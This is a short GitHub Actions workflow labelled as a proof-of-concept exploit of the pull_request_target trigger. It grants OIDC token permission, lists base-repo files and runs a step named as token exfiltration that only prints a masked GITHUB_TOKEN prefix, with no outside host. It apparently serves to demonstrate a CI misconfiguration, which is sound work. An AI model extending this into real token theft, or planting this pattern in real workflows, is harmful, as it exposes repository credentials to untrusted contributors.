name: PoC - PR Target Exploit

on:
  pull_request_target:

permissions:
  id-token: write   # needed for OIDC tokens
  contents: read    # minimal read access

jobs:
  poc-exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Show repo context
        run: |
          echo "ðŸ”Ž Actor: $GITHUB_ACTOR"
          echo "ðŸ”Ž Event: $GITHUB_EVENT_NAME"
          echo "ðŸ”Ž Head Repo: ${{ github.event.pull_request.head.repo.full_name }}"
          echo "ðŸ”Ž Base Repo: ${{ github.repository }}"

      - name: List repo files (base repo checkout)
        uses: actions/checkout@v4
        with:
          repository: ${{ github.repository }}
          ref: ${{ github.event.pull_request.base.ref }}
      - run: |
          echo "ðŸ“‚ Files in repo root:"
          ls -la

      - name: Exfiltrate GITHUB_TOKEN (PoC safe demo)
        run: |
          echo "TOKEN starts with: ${GITHUB_TOKEN:0:4}****"
          echo "âœ… Successfully accessed base repo token scope"
